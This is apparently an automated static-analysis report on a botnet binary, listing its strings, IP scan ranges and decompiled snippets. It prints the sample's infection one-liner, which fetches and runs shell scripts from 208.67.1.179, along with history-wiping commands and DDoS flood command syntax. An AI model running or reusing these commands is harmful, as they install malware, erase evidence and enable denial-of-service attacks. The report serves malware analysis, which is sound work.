=============================================================================
========	BINARY ID :4f54219188f52fc890628bc700990b1ff686d8d6==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :1717
SUPSCPECTED LINES COUNT :180
SUPSCPECTED STRINGS COUNT (DISTINCT) :31
SUPSCPECTED STRINGS WEIGHT :120
SUSPECT STRING SCORE : [120 / 150] 80%
USER AGENTS STRINGS COUNT :9
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :198
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
bin*
botnet
swatnet
fucknet
cracknet
weednet
gaynet
queernet
ballnet
unet
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
telnet
/dev/netslink/
/usr/
/bin/sh
/proc/cpuinfo
PING
Failed opening raw socket.
Invalid flag "%s"
pkill -9 
pkill -9 "
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
SCANNER
STOPPING SCANNER
STARTING SCANNER ON -> %s
COMMENCING BOT KILL ON -> %s
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
HTTP
HTTPFLOOD
CNC <target> <port> <time>
STD <target> <port> <time>
KILLATTK
Killed %d.
None Killed.
/proc/net/route
TOXICNET
/etc/rc.d/rc.local
fork failed\n
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/arm/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4142
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
libc/sysdeps/linux/arm/sigrestorer.S
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
waitpid
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
GetRandomIP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
sendHTTP2
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
__GI_inet_pton
gethostbyname
__vfork
knownBots
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
__GI_vfork
__GI_inet_addr
__libc_connect
pids
sigprocmask
.ëꀰϡꀀ￡ꀐ㧣 ëꀰ￡̰賢鼯ǥ숰童.ëꀰϡꀀ￡ꀐャ ëꀰ￡̰棢鼯˥숰燥.ëꀰϡꀀ￡ꀐ⟣ ëꀰ￡̰䓢鼯ϥ숰棥.ëꀰϡꀀ￡ꀐợ ëꀰ￡̰⃢鼯ӥ숰忥.ëꀰϡꀀ탡ꀐᗣ ëꀰსରქᬰå匀ৣ
\tëꀰǡ茰Ϣꀀ瓡\rëꀰϡꀐ뗡ꀴ쏣ꀺӡꀡᓡ䬀â舠Ϡ舰à茐ⓥᬠ뗥ꀴ쏣ꀺˡꀡᓡ䬐Ǣ舠Ϡ舰à鍀⃥ᬰϥꀀ맡\tëꀰǡ茰Ӣꀠˡꀀáꀐϣꀠ苡\t⓫ᬠ뗥ꀴ쏣ꀺˡꀡᓡ䬀â舠Ϡ舰à錰⃥ᬠϥꀀˡꀐૡ\n⓫ᬰǥ茰ⓢରåꀀᓣ鼑㓥\vëꀰ⃡ର⃥ᬰå匀쇣
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
208.67.1.179:23
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
112.5.%d.%d
117.165.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
221.120.%d.%d
88.5.%d.%d
41.254.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
103.54.%d.%d
27.255.%d.%d
103.204.%d.%d
123.24.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
116.71.%d.%d
103.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
117.175.%d.%d
178.93.%d.%d
111.9.%d.%d
222.252.%d.%d
113.174.%d.%d
113.160.%d.%d
113.161.%d.%d
113.162.%d.%d
113.163.%d.%d
113.164.%d.%d
113.165.%d.%d
113.166.%d.%d
113.167.%d.%d
113.168.%d.%d
113.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
41.208.%d.%d
183.220.%d.%d
175.201.%d.%d
103.198.%d.%d
50.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
85.105.%d.%d
188.3.%d.%d
103.203.%d.%d
103.55.%d.%d
103.220.%d.%d
183.233.%d.%d
103.242.%d.%d
103.14.%d.%d
103.195.%d.%d
103.214.%d.%d
103.218.%d.%d
103.225.%d.%d
103.228.%d.%d
103.231.%d.%d
103.60.%d.%d
103.248.%d.%d
103.253.%d.%d
103.255.%d.%d
103.35.%d.%d
103.49.%d.%d
103.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
113.176.%d.%d
113.175.%d.%d
113.177.%d.%d
113.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
117.181.%d.%d
117.178.%d.%d
117.177.%d.%d
117.176.%d.%d
117.170.%d.%d
117.171.%d.%d
117.162.%d.%d
112.26.%d.%d
112.27.%d.%d
112.28.%d.%d
112.29.%d.%d
112.30.%d.%d
112.31.%d.%d
203.150.%d.%d
50.233.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
cd /root;rm -rf .bash_history
ClearHistory
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 82147
+++TOTAL FUNCTIONS 			:302
+++LINES PER FUNCTION RATIO 	: 272.009933774834
+++SUSPECTED LINES COUNT 	: 1406
+++SUSPECTED LINES RATIO 	: 1.7115658514614
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 82147
+++WHILE (TRUE) LINES			: 14200
+++WHILE (TRUE) LINES RATION		:17.286084701815%
+++WHILE (TRUE) LOOPS COUNT		: 211
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
    char (*v92)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v165 = __libc_open("/proc/cpuinfo", 0); // 0x9608
    int32_t v167 = __libc_open("/proc/cpuinfo", 0); // 0x9840
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
        int32_t v170 = __libc_open("/proc/net/route", 0); // 0x11b64
    int32_t v159 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x11e40
    char * v161 = "/etc/rc.d/rc.local";
        v160 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        v161 = "/etc/rc.conf";
                                int32_t v181 = __GI_fopen((int32_t)v161, (int32_t)&v180); // 0x11fc8
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen();
int32_t _stdio_fopen(void) {
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, v168);
    int32_t result2 = __libc_open("/dev/null", (int32_t)a2); // 0x17064
    int32_t v166 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v165); // 0x195c4
        int32_t v169 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v165); // 0x195d8
    int32_t result = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v164); // 0x1a850
        return __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v164);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "208.67.1.179:23"

    char (*v90)[16] = "208.67.1.179:23";

    char (*v92)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";

        szprintf(v164, (int32_t)"112.5.%d.%d", (int32_t)v165, (int32_t)v166, 0);

        szprintf(v164, (int32_t)"117.165.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"85.3.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"37.158.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"95.9.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"41.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"58.71.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"104.55.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"78.186.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"78.189.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"221.120.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"88.5.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"41.254.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.20.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.47.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.57.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"45.117.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"101.51.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"137.59.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"1.56.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"1.188.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.204.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"27.0.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"27.8.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"27.50.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"27.54.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"27.98.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"27.112.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"27.192.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"36.32.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"36.248.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"39.64.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.4.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.48.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.52.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.56.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.63.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.84.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.224.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"42.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"43.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"43.230.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"163.53.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"43.230.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"62.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"43.245.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"62.255.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.25.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.54.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"27.255.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.204.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.24.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.191.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"81.100.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.188.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.189.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"94.174.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.160.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.161.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.162.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.163.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.164.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.165.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.166.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.167.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.168.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.169.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.170.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.171.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.172.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.173.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.174.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.175.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.177.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.178.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.179.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.180.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.181.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.182.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.183.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.184.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.185.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.186.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.187.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.188.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.189.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.190.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.191.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"45.121.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"45.120.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"45.115.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"43.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"43.230.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"43.240.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"43.245.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"41.174.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"49.118.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"78.188.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"45.127.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.30.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"14.33.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"123.16.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"202.44.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"116.93.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"91.83.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"41.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.173.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.190.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"146.88.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"112.196.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.178.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"112.45.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"183.223.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"116.71.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"103.44.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"110.235.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"124.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"211.237.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.175.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"117.173.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"178.93.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"111.9.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"222.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.174.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"222.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.160.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.161.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.162.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

        szprintf(v164, (int32_t)"113.163.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);

